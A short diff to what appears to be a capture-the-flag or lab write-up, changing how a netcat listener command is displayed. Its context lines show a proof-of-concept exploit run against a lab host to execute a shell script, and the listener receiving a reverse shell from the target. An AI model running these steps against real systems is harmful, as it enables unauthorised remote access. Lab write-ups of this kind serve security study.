@@ -124,7 +124,7 @@ root@kali: python2 poc.py http://192.168.127.240:8080/ 'bash /dev/shm/shell.sh'
 and on my machine :
 
 ```bash
-nc -nvlp 4444
+root@kali: nc -nvlp 4444
 listening on [any] 4444 ...
 connect to [192.168.127.128] from (UNKNOWN) [192.168.127.240] 53568
 bash: no job control in this shell
